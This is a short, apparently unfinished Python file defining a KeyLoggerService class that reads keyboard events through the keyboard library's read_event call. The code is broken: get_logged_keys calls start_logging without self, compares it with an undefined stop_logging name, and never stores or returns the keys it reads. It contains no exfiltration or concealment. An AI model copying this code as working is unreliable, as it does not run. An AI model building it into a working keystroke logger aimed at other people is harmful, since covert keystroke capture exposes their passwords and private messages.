import key_logger_interface
import keyboard
from datetime import datetime, timedelta


class KeyLoggerService(key_logger_interface.KeyLoggerInterface):

    def start_logging(self):
        start_time = datetime.now()
        return start_time



    def get_logged_keys(self):
        while start_logging() <= stop_logging:
            event=keyboard.read_event()

    def stop_logging(self):
        stop_time = datetime.now()
        return stop_time


    
